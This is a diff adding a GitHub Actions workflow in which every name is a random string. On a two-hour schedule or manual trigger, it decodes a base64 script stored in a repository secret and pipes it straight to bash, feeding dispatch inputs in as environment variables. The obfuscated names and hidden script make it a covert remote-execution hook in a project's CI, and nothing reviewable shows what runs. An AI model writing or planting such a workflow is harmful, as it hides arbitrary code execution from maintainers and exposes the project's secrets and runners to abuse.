@@ -1,0 +1,33 @@
+name: zpParAjVnSz
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+    inputs:
+      UjnYVUSTVS:
+        required: false
+      dMlLCh:
+        required: false
+      GLaXqYWMw:
+        required: false
+      vJeUsdUxgvfP:
+        required: false
+      uYvvQWSSkMB:
+        required: false
+jobs:
+  EQUrwRG:
+    runs-on: ubuntu-latest
+    env:
+      CEoKXEErb: ${{ secrets.aGWYHytW }}
+    steps:
+      - uses: actions/checkout@v5
+      - if: github.event.inputs.UjnYVUSTVS == ''
+        run: echo "${{ secrets.USWauUtNzZJ }}" | base64 -d | bash
+      - if: github.event.inputs.UjnYVUSTVS != ''
+        run: echo "${{ secrets.zsoXuD }}" | base64 -d | bash
+        env:
+          VxpPtAHjzKoJ: ${{ github.event.inputs.UjnYVUSTVS }}
+          qRlnFmGUNgX: ${{ github.event.inputs.dMlLCh }}
+          vkSFlzpeJo: ${{ github.event.inputs.GLaXqYWMw }}
+          NOUBpZmHz: ${{ github.event.inputs.vJeUsdUxgvfP }}
+          ebIkZbJS: ${{ github.event.inputs.uYvvQWSSkMB }}
